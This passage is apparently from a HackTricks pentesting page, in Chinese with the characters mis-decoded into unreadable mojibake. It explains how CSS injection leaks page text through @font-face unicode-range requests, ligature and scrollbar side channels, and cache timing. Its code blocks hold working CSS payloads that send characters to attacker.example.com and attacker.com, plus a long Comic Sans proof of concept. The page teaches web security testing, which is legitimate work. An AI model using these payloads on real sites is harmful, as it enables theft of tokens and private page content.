<p>æ‚¨å¯ä»¥åœ¨è¿™é‡ŒæŸ¥çœ‹ä¸€ä¸ª<a href="https://gist.github.com/haqpl/52455c8ddfec33aeefb468301d70b6eb"><strong>ä½¿ç”¨æ­¤æŠ€æœ¯çš„CTFåˆ©ç”¨</strong></a>ã€‚</p>
<h3 id="font-face--unicode-range"><a class="header" href="#font-face--unicode-range">@font-face / unicode-range <a href="#text-node-exfiltration-i-ligatures" id="text-node-exfiltration-i-ligatures"></a></a></h3>
<p>æ‚¨å¯ä»¥ä¸ºç‰¹å®šçš„unicodeå€¼æŒ‡å®š<strong>å¤–éƒ¨å­—ä½“</strong>ï¼Œè¿™äº›å­—ä½“<strong>ä»…åœ¨é¡µé¢ä¸­å­˜åœ¨è¿™äº›unicodeå€¼æ—¶</strong>è¢«<strong>æ”¶é›†</strong>ã€‚ä¾‹å¦‚ï¼š</p>
<pre><code class="language-html">&lt;style&gt;
@font-face{
font-family:poc;
src: url(http://attacker.example.com/?A); /* fetched */
unicode-range:U+0041;
}
@font-face{
font-family:poc;
src: url(http://attacker.example.com/?B); /* fetched too */
unicode-range:U+0042;
}
@font-face{
font-family:poc;
src: url(http://attacker.example.com/?C); /* not fetched */
unicode-range:U+0043;
}
#sensitive-information{
font-family:poc;
}
&lt;/style&gt;

&lt;p id="sensitive-information"&gt;AB&lt;/p&gt;htm
</code></pre>
<p>å½“æ‚¨è®¿é—®æ­¤é¡µé¢æ—¶ï¼ŒChrome å’Œ Firefox ä¼šè·å– "?A" å’Œ "?B"ï¼Œå› ä¸ºæ•æ„Ÿä¿¡æ¯çš„æ–‡æœ¬èŠ‚ç‚¹åŒ…å« "A" å’Œ "B" å­—ç¬¦ã€‚ä½† Chrome å’Œ Firefox ä¸ä¼šè·å– "?C"ï¼Œå› ä¸ºå®ƒä¸åŒ…å« "C"ã€‚è¿™æ„å‘³ç€æˆ‘ä»¬èƒ½å¤Ÿè¯»å– "A" å’Œ "B"ã€‚</p>
<h3 id="æ–‡æœ¬èŠ‚ç‚¹å¤–æ³„-i-è¿å­—"><a class="header" href="#æ–‡æœ¬èŠ‚ç‚¹å¤–æ³„-i-è¿å­—">æ–‡æœ¬èŠ‚ç‚¹å¤–æ³„ (I): è¿å­— <a href="#text-node-exfiltration-i-ligatures" id="text-node-exfiltration-i-ligatures"></a></a></h3>
<p><strong>å‚è€ƒ:</strong> <a href="https://sekurak.pl/wykradanie-danych-w-swietnym-stylu-czyli-jak-wykorzystac-css-y-do-atakow-na-webaplikacje/">Wykradanie danych w Å›wietnym stylu â€“ czyli jak wykorzystaÄ‡ CSS-y do atakÃ³w na webaplikacjÄ™</a></p>
<p>æ‰€æè¿°çš„æŠ€æœ¯æ¶‰åŠé€šè¿‡åˆ©ç”¨å­—ä½“è¿å­—å¹¶ç›‘æ§å®½åº¦å˜åŒ–æ¥æå–èŠ‚ç‚¹ä¸­çš„æ–‡æœ¬ã€‚è¯¥è¿‡ç¨‹åŒ…æ‹¬å‡ ä¸ªæ­¥éª¤ï¼š</p>
<ol>
<li><strong>åˆ›å»ºè‡ªå®šä¹‰å­—ä½“</strong>ï¼š</li>
</ol>
<ul>
<li>SVG å­—ä½“æ˜¯é€šè¿‡å…·æœ‰ <code>horiz-adv-x</code> å±æ€§çš„å­—å½¢åˆ¶ä½œçš„ï¼Œè¯¥å±æ€§ä¸ºè¡¨ç¤ºä¸¤ä¸ªå­—ç¬¦åºåˆ—çš„å­—å½¢è®¾ç½®äº†è¾ƒå¤§çš„å®½åº¦ã€‚</li>
<li>ç¤ºä¾‹ SVG å­—å½¢: <code>&lt;glyph unicode="XY" horiz-adv-x="8000" d="M1 0z"/&gt;</code>ï¼Œå…¶ä¸­ "XY" è¡¨ç¤ºä¸€ä¸ªä¸¤ä¸ªå­—ç¬¦çš„åºåˆ—ã€‚</li>
<li>ç„¶åä½¿ç”¨ fontforge å°†è¿™äº›å­—ä½“è½¬æ¢ä¸º woff æ ¼å¼ã€‚</li>
</ul>
<ol start="2">
<li><strong>æ£€æµ‹å®½åº¦å˜åŒ–</strong>ï¼š</li>
</ol>
<ul>
<li>ä½¿ç”¨ CSS ç¡®ä¿æ–‡æœ¬ä¸æ¢è¡Œ (<code>white-space: nowrap</code>) å¹¶è‡ªå®šä¹‰æ»šåŠ¨æ¡æ ·å¼ã€‚</li>
<li>æ°´å¹³æ»šåŠ¨æ¡çš„å‡ºç°ï¼Œæ ·å¼ç‹¬ç‰¹ï¼Œä½œä¸ºæŒ‡ç¤ºå™¨ï¼ˆç¥è°•ï¼‰ï¼Œè¡¨æ˜æ–‡æœ¬ä¸­å­˜åœ¨ç‰¹å®šçš„è¿å­—ï¼Œå› æ­¤å­˜åœ¨ç‰¹å®šçš„å­—ç¬¦åºåˆ—ã€‚</li>
<li>æ¶‰åŠçš„ CSSï¼š</li>
</ul>
<pre><code class="language-css">body { white-space: nowrap };
body::-webkit-scrollbar { background: blue; }
body::-webkit-scrollbar:horizontal { background: url(http://attacker.com/?leak); }
</code></pre>
<ol start="3">
<li><strong>åˆ©ç”¨è¿‡ç¨‹</strong>ï¼š</li>
</ol>
<ul>
<li><strong>æ­¥éª¤ 1</strong>ï¼šä¸ºå…·æœ‰è¾ƒå¤§å®½åº¦çš„å­—ç¬¦å¯¹åˆ›å»ºå­—ä½“ã€‚</li>
<li><strong>æ­¥éª¤ 2</strong>ï¼šä½¿ç”¨åŸºäºæ»šåŠ¨æ¡çš„æŠ€å·§æ¥æ£€æµ‹ä½•æ—¶æ¸²æŸ“å¤§å®½åº¦å­—å½¢ï¼ˆå­—ç¬¦å¯¹çš„è¿å­—ï¼‰ï¼ŒæŒ‡ç¤ºå­—ç¬¦åºåˆ—çš„å­˜åœ¨ã€‚</li>
<li><strong>æ­¥éª¤ 3</strong>ï¼šåœ¨æ£€æµ‹åˆ°è¿å­—åï¼Œç”Ÿæˆè¡¨ç¤ºä¸‰ä¸ªå­—ç¬¦åºåˆ—çš„æ–°å­—å½¢ï¼ŒåŒ…å«æ£€æµ‹åˆ°çš„å¯¹å¹¶æ·»åŠ å‰å¯¼æˆ–åç»­å­—ç¬¦ã€‚</li>
<li><strong>æ­¥éª¤ 4</strong>ï¼šè¿›è¡Œä¸‰ä¸ªå­—ç¬¦è¿å­—çš„æ£€æµ‹ã€‚</li>
<li><strong>æ­¥éª¤ 5</strong>ï¼šè¯¥è¿‡ç¨‹é‡å¤ï¼Œé€æ­¥æ­ç¤ºæ•´ä¸ªæ–‡æœ¬ã€‚</li>
</ul>
<ol start="4">
<li><strong>ä¼˜åŒ–</strong>ï¼š</li>
</ol>
<ul>
<li>å½“å‰ä½¿ç”¨ <code>&lt;meta refresh=...</code> çš„åˆå§‹åŒ–æ–¹æ³•å¹¶ä¸ç†æƒ³ã€‚</li>
<li>æ›´æœ‰æ•ˆçš„æ–¹æ³•å¯èƒ½æ¶‰åŠ CSS <code>@import</code> æŠ€å·§ï¼Œæé«˜åˆ©ç”¨çš„æ€§èƒ½ã€‚</li>
</ul>
<h3 id="æ–‡æœ¬èŠ‚ç‚¹å¤–æ³„-ii-ä½¿ç”¨é»˜è®¤å­—ä½“æ³„éœ²å­—ç¬¦é›†ä¸éœ€è¦å¤–éƒ¨èµ„æº"><a class="header" href="#æ–‡æœ¬èŠ‚ç‚¹å¤–æ³„-ii-ä½¿ç”¨é»˜è®¤å­—ä½“æ³„éœ²å­—ç¬¦é›†ä¸éœ€è¦å¤–éƒ¨èµ„æº">æ–‡æœ¬èŠ‚ç‚¹å¤–æ³„ (II): ä½¿ç”¨é»˜è®¤å­—ä½“æ³„éœ²å­—ç¬¦é›†ï¼ˆä¸éœ€è¦å¤–éƒ¨èµ„æºï¼‰ <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a></a></h3>
<p><strong>å‚è€ƒ:</strong> <a href="https://demo.vwzq.net/css2.html">PoC using Comic Sans by @Cgvwzq &amp; @Terjanq</a></p>
<p>è¿™ä¸ªæŠ€å·§åœ¨è¿™ä¸ª <a href="https://www.reddit.com/r/Slackers/comments/dzrx2s/what_can_we_do_with_single_css_injection/"><strong>Slackers çº¿ç¨‹</strong></a> ä¸­å‘å¸ƒã€‚æ–‡æœ¬èŠ‚ç‚¹ä¸­ä½¿ç”¨çš„å­—ç¬¦é›†å¯ä»¥ <strong>ä½¿ç”¨æµè§ˆå™¨ä¸­å®‰è£…çš„é»˜è®¤å­—ä½“</strong> æ³„éœ²ï¼šä¸éœ€è¦å¤–éƒ¨æˆ–è‡ªå®šä¹‰å­—ä½“ã€‚</p>
<p>è¯¥æ¦‚å¿µå›´ç»•åˆ©ç”¨åŠ¨ç”»é€æ­¥æ‰©å±• <code>div</code> çš„å®½åº¦ï¼Œä½¿ä¸€ä¸ªå­—ç¬¦ä¸€æ¬¡æ€§ä»æ–‡æœ¬çš„â€œåç¼€â€éƒ¨åˆ†è¿‡æ¸¡åˆ°â€œå‰ç¼€â€éƒ¨åˆ†ã€‚è¿™ä¸ªè¿‡ç¨‹æœ‰æ•ˆåœ°å°†æ–‡æœ¬åˆ†æˆä¸¤ä¸ªéƒ¨åˆ†ï¼š</p>
<ol>
<li><strong>å‰ç¼€</strong>ï¼šåˆå§‹è¡Œã€‚</li>
<li><strong>åç¼€</strong>ï¼šåç»­è¡Œã€‚</li>
</ol>
<p>å­—ç¬¦çš„è¿‡æ¸¡é˜¶æ®µå°†å¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<p><strong>C</strong><br />
ADB</p>
<p><strong>CA</strong><br />
DB</p>
<p><strong>CAD</strong><br />
B</p>
<p><strong>CADB</strong></p>
<p>åœ¨æ­¤è¿‡æ¸¡æœŸé—´ï¼Œ<strong>unicode-range æŠ€å·§</strong>è¢«ç”¨æ¥è¯†åˆ«æ¯ä¸ªæ–°å­—ç¬¦ï¼Œå› ä¸ºå®ƒåŠ å…¥å‰ç¼€ã€‚è¿™æ˜¯é€šè¿‡å°†å­—ä½“åˆ‡æ¢åˆ° Comic Sans æ¥å®ç°çš„ï¼Œåè€…æ˜æ˜¾æ¯”é»˜è®¤å­—ä½“é«˜ï¼Œä»è€Œè§¦å‘å‚ç›´æ»šåŠ¨æ¡ã€‚è¿™ä¸ªæ»šåŠ¨æ¡çš„å‡ºç°é—´æ¥æ­ç¤ºäº†å‰ç¼€ä¸­å­˜åœ¨æ–°å­—ç¬¦ã€‚</p>
<p>å°½ç®¡è¿™ç§æ–¹æ³•å…è®¸æ£€æµ‹åˆ°ç‹¬ç‰¹å­—ç¬¦çš„å‡ºç°ï¼Œä½†å¹¶æœªæŒ‡å®šå“ªä¸ªå­—ç¬¦è¢«é‡å¤ï¼Œä»…ä»…è¡¨æ˜å‘ç”Ÿäº†é‡å¤ã€‚</p>
<p>{% hint style="info" %}
åŸºæœ¬ä¸Šï¼Œ<strong>unicode-range ç”¨äºæ£€æµ‹å­—ç¬¦</strong>ï¼Œä½†ç”±äºæˆ‘ä»¬ä¸æƒ³åŠ è½½å¤–éƒ¨å­—ä½“ï¼Œå› æ­¤éœ€è¦æ‰¾åˆ°å¦ä¸€ç§æ–¹æ³•ã€‚<br />
å½“ <strong>å­—ç¬¦</strong> è¢« <strong>æ‰¾åˆ°</strong> æ—¶ï¼Œå®ƒè¢« <strong>èµ‹äºˆ</strong> é¢„å®‰è£…çš„ <strong>Comic Sans å­—ä½“</strong>ï¼Œè¿™ä½¿å¾—å­—ç¬¦ <strong>å˜å¤§</strong> å¹¶ <strong>è§¦å‘æ»šåŠ¨æ¡</strong>ï¼Œè¿™å°† <strong>æ³„éœ²æ‰¾åˆ°çš„å­—ç¬¦</strong>ã€‚
{% endhint %}</p>
<p>æ£€æŸ¥ä» PoC ä¸­æå–çš„ä»£ç ï¼š</p>
<pre><code class="language-css">/* comic sans is high (lol) and causes a vertical overflow */
@font-face{font-family:has_A;src:local('Comic Sans MS');unicode-range:U+41;font-style:monospace;}
@font-face{font-family:has_B;src:local('Comic Sans MS');unicode-range:U+42;font-style:monospace;}
@font-face{font-family:has_C;src:local('Comic Sans MS');unicode-range:U+43;font-style:monospace;}
@font-face{font-family:has_D;src:local('Comic Sans MS');unicode-range:U+44;font-style:monospace;}
@font-face{font-family:has_E;src:local('Comic Sans MS');unicode-range:U+45;font-style:monospace;}
@font-face{font-family:has_F;src:local('Comic Sans MS');unicode-range:U+46;font-style:monospace;}
@font-face{font-family:has_G;src:local('Comic Sans MS');unicode-range:U+47;font-style:monospace;}
@font-face{font-family:has_H;src:local('Comic Sans MS');unicode-range:U+48;font-style:monospace;}
@font-face{font-family:has_I;src:local('Comic Sans MS');unicode-range:U+49;font-style:monospace;}
@font-face{font-family:has_J;src:local('Comic Sans MS');unicode-range:U+4a;font-style:monospace;}
@font-face{font-family:has_K;src:local('Comic Sans MS');unicode-range:U+4b;font-style:monospace;}
@font-face{font-family:has_L;src:local('Comic Sans MS');unicode-range:U+4c;font-style:monospace;}
@font-face{font-family:has_M;src:local('Comic Sans MS');unicode-range:U+4d;font-style:monospace;}
@font-face{font-family:has_N;src:local('Comic Sans MS');unicode-range:U+4e;font-style:monospace;}
@font-face{font-family:has_O;src:local('Comic Sans MS');unicode-range:U+4f;font-style:monospace;}
@font-face{font-family:has_P;src:local('Comic Sans MS');unicode-range:U+50;font-style:monospace;}
@font-face{font-family:has_Q;src:local('Comic Sans MS');unicode-range:U+51;font-style:monospace;}
@font-face{font-family:has_R;src:local('Comic Sans MS');unicode-range:U+52;font-style:monospace;}
@font-face{font-family:has_S;src:local('Comic Sans MS');unicode-range:U+53;font-style:monospace;}
@font-face{font-family:has_T;src:local('Comic Sans MS');unicode-range:U+54;font-style:monospace;}
@font-face{font-family:has_U;src:local('Comic Sans MS');unicode-range:U+55;font-style:monospace;}
@font-face{font-family:has_V;src:local('Comic Sans MS');unicode-range:U+56;font-style:monospace;}
@font-face{font-family:has_W;src:local('Comic Sans MS');unicode-range:U+57;font-style:monospace;}
@font-face{font-family:has_X;src:local('Comic Sans MS');unicode-range:U+58;font-style:monospace;}
@font-face{font-family:has_Y;src:local('Comic Sans MS');unicode-range:U+59;font-style:monospace;}
@font-face{font-family:has_Z;src:local('Comic Sans MS');unicode-range:U+5a;font-style:monospace;}
@font-face{font-family:has_0;src:local('Comic Sans MS');unicode-range:U+30;font-style:monospace;}
@font-face{font-family:has_1;src:local('Comic Sans MS');unicode-range:U+31;font-style:monospace;}
@font-face{font-family:has_2;src:local('Comic Sans MS');unicode-range:U+32;font-style:monospace;}
@font-face{font-family:has_3;src:local('Comic Sans MS');unicode-range:U+33;font-style:monospace;}
@font-face{font-family:has_4;src:local('Comic Sans MS');unicode-range:U+34;font-style:monospace;}
@font-face{font-family:has_5;src:local('Comic Sans MS');unicode-range:U+35;font-style:monospace;}
@font-face{font-family:has_6;src:local('Comic Sans MS');unicode-range:U+36;font-style:monospace;}
@font-face{font-family:has_7;src:local('Comic Sans MS');unicode-range:U+37;font-style:monospace;}
@font-face{font-family:has_8;src:local('Comic Sans MS');unicode-range:U+38;font-style:monospace;}
@font-face{font-family:has_9;src:local('Comic Sans MS');unicode-range:U+39;font-style:monospace;}
@font-face{font-family:rest;src: local('Courier New');font-style:monospace;unicode-range:U+0-10FFFF}

div.leak {
overflow-y: auto; /* leak channel */
overflow-x: hidden; /* remove false positives */
height: 40px; /* comic sans capitals exceed this height */
font-size: 0px; /* make suffix invisible */
letter-spacing: 0px; /* separation */
word-break: break-all; /* small width split words in lines */
font-family: rest; /* default */
background: grey; /* default */
width: 0px; /* initial value */
animation: loop step-end 200s 0s, trychar step-end 2s 0s; /* animations: trychar duration must be 1/100th of loop duration */
animation-iteration-count: 1, infinite; /* single width iteration, repeat trychar one per width increase (or infinite) */
}

div.leak::first-line{
font-size: 30px; /* prefix is visible in first line */
text-transform: uppercase; /* only capital letters leak */
}

/* iterate over all chars */
@keyframes trychar {
0% { font-family: rest; } /* delay for width change */
5% { font-family: has_A, rest; --leak: url(?a); }
6% { font-family: rest; }
10% { font-family: has_B, rest; --leak: url(?b); }
11% { font-family: rest; }
15% { font-family: has_C, rest; --leak: url(?c); }
16% { font-family: rest }
20% { font-family: has_D, rest; --leak: url(?d); }
21% { font-family: rest; }
25% { font-family: has_E, rest; --leak: url(?e); }
26% { font-family: rest; }
30% { font-family: has_F, rest; --leak: url(?f); }
31% { font-family: rest; }
35% { font-family: has_G, rest; --leak: url(?g); }
36% { font-family: rest; }
40% { font-family: has_H, rest; --leak: url(?h); }
41% { font-family: rest }
45% { font-family: has_I, rest; --leak: url(?i); }
46% { font-family: rest; }
50% { font-family: has_J, rest; --leak: url(?j); }
51% { font-family: rest; }
55% { font-family: has_K, rest; --leak: url(?k); }
56% { font-family: rest; }
60% { font-family: has_L, rest; --leak: url(?l); }
61% { font-family: rest; }
65% { font-family: has_M, rest; --leak: url(?m); }
66% { font-family: rest; }
70% { font-family: has_N, rest; --leak: url(?n); }
71% { font-family: rest; }
75% { font-family: has_O, rest; --leak: url(?o); }
76% { font-family: rest; }
80% { font-family: has_P, rest; --leak: url(?p); }
81% { font-family: rest; }
85% { font-family: has_Q, rest; --leak: url(?q); }
86% { font-family: rest; }
90% { font-family: has_R, rest; --leak: url(?r); }
91% { font-family: rest; }
95% { font-family: has_S, rest; --leak: url(?s); }
96% { font-family: rest; }
}

/* increase width char by char, i.e. add new char to prefix */
@keyframes loop {
0% { width: 0px }
1% { width: 20px }
2% { width: 40px }
3% { width: 60px }
4% { width: 80px }
4% { width: 100px }
5% { width: 120px }
6% { width: 140px }
7% { width: 0px }
}

div::-webkit-scrollbar {
background: blue;
}

/* side-channel */
div::-webkit-scrollbar:vertical {
background: blue var(--leak);
}
</code></pre>
<h3 id="æ–‡æœ¬èŠ‚ç‚¹å¤–æ³„-iiié€šè¿‡éšè—å…ƒç´ ä»¥é»˜è®¤å­—ä½“æ³„éœ²å­—ç¬¦é›†ä¸éœ€è¦å¤–éƒ¨èµ„æº"><a class="header" href="#æ–‡æœ¬èŠ‚ç‚¹å¤–æ³„-iiié€šè¿‡éšè—å…ƒç´ ä»¥é»˜è®¤å­—ä½“æ³„éœ²å­—ç¬¦é›†ä¸éœ€è¦å¤–éƒ¨èµ„æº">æ–‡æœ¬èŠ‚ç‚¹å¤–æ³„ (III)ï¼šé€šè¿‡éšè—å…ƒç´ ä»¥é»˜è®¤å­—ä½“æ³„éœ²å­—ç¬¦é›†ï¼ˆä¸éœ€è¦å¤–éƒ¨èµ„æºï¼‰ <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a></a></h3>
<p><strong>å‚è€ƒï¼š</strong> è¿™åœ¨<a href="https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/#ninja1-solves">è¿™ç¯‡æ–‡ç« ä¸­è¢«æåˆ°ä½œä¸ºä¸€ä¸ªä¸æˆåŠŸçš„è§£å†³æ–¹æ¡ˆ</a></p>
<p>è¿™ä¸ªæ¡ˆä¾‹ä¸ä¹‹å‰çš„éå¸¸ç›¸ä¼¼ï¼Œç„¶è€Œï¼Œåœ¨è¿™ä¸ªæ¡ˆä¾‹ä¸­ï¼Œç‰¹å®šå­—ç¬¦æ¯”å…¶ä»–å­—ç¬¦æ›´å¤§çš„ç›®æ ‡æ˜¯<strong>éšè—æŸäº›ä¸œè¥¿</strong>ï¼Œæ¯”å¦‚ä¸€ä¸ªä¸å¸Œæœ›è¢«æœºå™¨äººç‚¹å‡»çš„æŒ‰é’®æˆ–ä¸€ä¸ªä¸ä¼šè¢«åŠ è½½çš„å›¾åƒã€‚å› æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥æµ‹é‡è¿™ä¸ªåŠ¨ä½œï¼ˆæˆ–ç¼ºä¹åŠ¨ä½œï¼‰ï¼Œå¹¶çŸ¥é“ç‰¹å®šå­—ç¬¦æ˜¯å¦å­˜åœ¨äºæ–‡æœ¬ä¸­ã€‚</p>
<h3 id="æ–‡æœ¬èŠ‚ç‚¹å¤–æ³„-iiié€šè¿‡ç¼“å­˜æ—¶é—´æ³„éœ²å­—ç¬¦é›†ä¸éœ€è¦å¤–éƒ¨èµ„æº"><a class="header" href="#æ–‡æœ¬èŠ‚ç‚¹å¤–æ³„-iiié€šè¿‡ç¼“å­˜æ—¶é—´æ³„éœ²å­—ç¬¦é›†ä¸éœ€è¦å¤–éƒ¨èµ„æº">æ–‡æœ¬èŠ‚ç‚¹å¤–æ³„ (III)ï¼šé€šè¿‡ç¼“å­˜æ—¶é—´æ³„éœ²å­—ç¬¦é›†ï¼ˆä¸éœ€è¦å¤–éƒ¨èµ„æºï¼‰ <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a></a></h3>
<p><strong>å‚è€ƒï¼š</strong> è¿™åœ¨<a href="https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/#ninja1-solves">è¿™ç¯‡æ–‡ç« ä¸­è¢«æåˆ°ä½œä¸ºä¸€ä¸ªä¸æˆåŠŸçš„è§£å†³æ–¹æ¡ˆ</a></p>
<p>åœ¨è¿™ä¸ªæ¡ˆä¾‹ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•é€šè¿‡ä»åŒä¸€æ¥æºåŠ è½½ä¸€ä¸ªå‡å­—ä½“æ¥æ³„éœ²å­—ç¬¦æ˜¯å¦åœ¨æ–‡æœ¬ä¸­ï¼š</p>
<pre><code class="language-css">@font-face {
font-family: "A1";
src: url(/static/bootstrap.min.css?q=1);
unicode-range: U+0041;
}
</code></pre>
<p>å¦‚æœåŒ¹é…æˆåŠŸï¼Œ<strong>å­—ä½“å°†ä» <code>/static/bootstrap.min.css?q=1</code> åŠ è½½</strong>ã€‚è™½ç„¶å®ƒä¸ä¼šæˆåŠŸåŠ è½½ï¼Œä½†<strong>æµè§ˆå™¨åº”è¯¥ç¼“å­˜å®ƒ</strong>ï¼Œå³ä½¿æ²¡æœ‰ç¼“å­˜ï¼Œä¹Ÿæœ‰<strong>304æœªä¿®æ”¹</strong>æœºåˆ¶ï¼Œå› æ­¤<strong>å“åº”åº”è¯¥æ¯”å…¶ä»–å†…å®¹æ›´å¿«</strong>ã€‚</p>
<p>ç„¶è€Œï¼Œå¦‚æœç¼“å­˜å“åº”ä¸éç¼“å­˜å“åº”çš„æ—¶é—´å·®ä¸å¤Ÿå¤§ï¼Œè¿™å°†æ²¡æœ‰ç”¨ã€‚ä¾‹å¦‚ï¼Œä½œè€…æåˆ°ï¼šç„¶è€Œï¼Œç»è¿‡æµ‹è¯•ï¼Œæˆ‘å‘ç°ç¬¬ä¸€ä¸ªé—®é¢˜æ˜¯é€Ÿåº¦æ²¡æœ‰å¤ªå¤§å·®åˆ«ï¼Œç¬¬äºŒä¸ªé—®é¢˜æ˜¯æœºå™¨äººä½¿ç”¨äº† <code>disk-cache-size=1</code> æ ‡å¿—ï¼Œè¿™çœŸçš„å¾ˆå‘¨åˆ°ã€‚</p>
<h3 id="æ–‡æœ¬èŠ‚ç‚¹å¤–æ³„-iiié€šè¿‡å®šæ—¶åŠ è½½æ•°ç™¾ä¸ªæœ¬åœ°å­—ä½“ä¸éœ€è¦å¤–éƒ¨èµ„æºæ³„éœ²å­—ç¬¦é›†"><a class="header" href="#æ–‡æœ¬èŠ‚ç‚¹å¤–æ³„-iiié€šè¿‡å®šæ—¶åŠ è½½æ•°ç™¾ä¸ªæœ¬åœ°å­—ä½“ä¸éœ€è¦å¤–éƒ¨èµ„æºæ³„éœ²å­—ç¬¦é›†">æ–‡æœ¬èŠ‚ç‚¹å¤–æ³„ (III)ï¼šé€šè¿‡å®šæ—¶åŠ è½½æ•°ç™¾ä¸ªæœ¬åœ°â€œå­—ä½“â€ï¼ˆä¸éœ€è¦å¤–éƒ¨èµ„æºï¼‰æ³„éœ²å­—ç¬¦é›† <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a></a></h3>
<p><strong>å‚è€ƒï¼š</strong> è¿™åœ¨ <a href="https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/#ninja1-solves">è¿™ç¯‡æ–‡ç« ä¸­è¢«æåˆ°ä½œä¸ºä¸€ä¸ªä¸æˆåŠŸçš„è§£å†³æ–¹æ¡ˆ</a></p>
<p>åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå½“å‘ç”ŸåŒ¹é…æ—¶ï¼Œæ‚¨å¯ä»¥æŒ‡ç¤º<strong>CSSä»åŒä¸€æ¥æºåŠ è½½æ•°ç™¾ä¸ªå‡å­—ä½“</strong>ã€‚è¿™æ ·æ‚¨å¯ä»¥<strong>æµ‹é‡æ‰€éœ€æ—¶é—´</strong>ï¼Œå¹¶æ‰¾å‡ºæŸä¸ªå­—ç¬¦æ˜¯å¦å‡ºç°ï¼Œæ–¹æ³•å¦‚ä¸‹ï¼š</p>
<pre><code class="language-css">@font-face {
font-family: "A1";
src: url(/static/bootstrap.min.css?q=1),
url(/static/bootstrap.min.css?q=2),
....
url(/static/bootstrap.min.css?q=500);
unicode-range: U+0041;
}
</code></pre>
<p>è€Œæœºå™¨äººçš„ä»£ç çœ‹èµ·æ¥åƒè¿™æ ·ï¼š</p>
<pre><code class="language-python">browser.get(url)
WebDriverWait(browser, 30).until(lambda r: r.execute_script('return document.readyState') == 'complete')
time.sleep(30)
</code></pre>
<p>æ‰€ä»¥ï¼Œå¦‚æœå­—ä½“ä¸åŒ¹é…ï¼Œè®¿é—®æœºå™¨äººæ—¶çš„å“åº”æ—¶é—´é¢„è®¡çº¦ä¸º 30 ç§’ã€‚ç„¶è€Œï¼Œå¦‚æœå­˜åœ¨å­—ä½“åŒ¹é…ï¼Œå°†ä¼šå‘é€å¤šä¸ªè¯·æ±‚ä»¥æ£€ç´¢å­—ä½“ï¼Œå¯¼è‡´ç½‘ç»œæŒç»­æ´»åŠ¨ã€‚å› æ­¤ï¼Œæ»¡è¶³åœæ­¢æ¡ä»¶å¹¶æ¥æ”¶å“åº”æ‰€éœ€çš„æ—¶é—´ä¼šæ›´é•¿ã€‚å› æ­¤ï¼Œå“åº”æ—¶é—´å¯ä»¥ä½œä¸ºåˆ¤æ–­æ˜¯å¦å­˜åœ¨å­—ä½“åŒ¹é…çš„æŒ‡æ ‡ã€‚</p>
<h2 id="å‚è€ƒæ–‡çŒ®"><a class="header" href="#å‚è€ƒæ–‡çŒ®">å‚è€ƒæ–‡çŒ®</a></h2>
<ul>
<li><a href="https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e">https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e</a></li>
<li><a href="https://d0nut.medium.com/better-exfiltration-via-html-injection-31c72a2dae8b">https://d0nut.medium.com/better-exfiltration-via-html-injection-31c72a2dae8b</a></li>
<li><a href="https://infosecwriteups.com/exfiltration-via-css-injection-4e999f63097d">https://infosecwriteups.com/exfiltration-via-css-injection-4e999f63097d</a></li>
<li><a href="https://x-c3ll.github.io/posts/CSS-Injection-Primitives/">https://x-c3ll.github.io/posts/CSS-Injection-Primitives/</a></li>
</ul>
<p>{% hint style="success" %}
å­¦ä¹ å’Œå®è·µ AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks Training AWS Red Team Expert (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
å­¦ä¹ å’Œå®è·µ GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks Training GCP Red Team Expert (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>æ”¯æŒ HackTricks</summary>
<ul>
<li>æŸ¥çœ‹ <a href="https://github.com/sponsors/carlospolop"><strong>è®¢é˜…è®¡åˆ’</strong></a>!</li>
<li><strong>åŠ å…¥</strong> ğŸ’¬ <a href="https://discord.gg/hRep4RUj7f"><strong>Discord ç¾¤ç»„</strong></a> æˆ– <a href="https://t.me/peass"><strong>ç”µæŠ¥ç¾¤ç»„</strong></a> æˆ– <strong>åœ¨</strong> <strong>Twitter</strong> ğŸ¦ <strong>ä¸Šå…³æ³¨æˆ‘ä»¬</strong> <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>é€šè¿‡å‘</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> å’Œ <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> github ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚</li>
</ul>
</details>
{% endhint %}

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../../../pentesting-web/xs-search/javascript-execution-xs-leak.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>

                            <a rel="next prefetch" href="../../../pentesting-web/xs-search/css-injection/css-injection-code.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
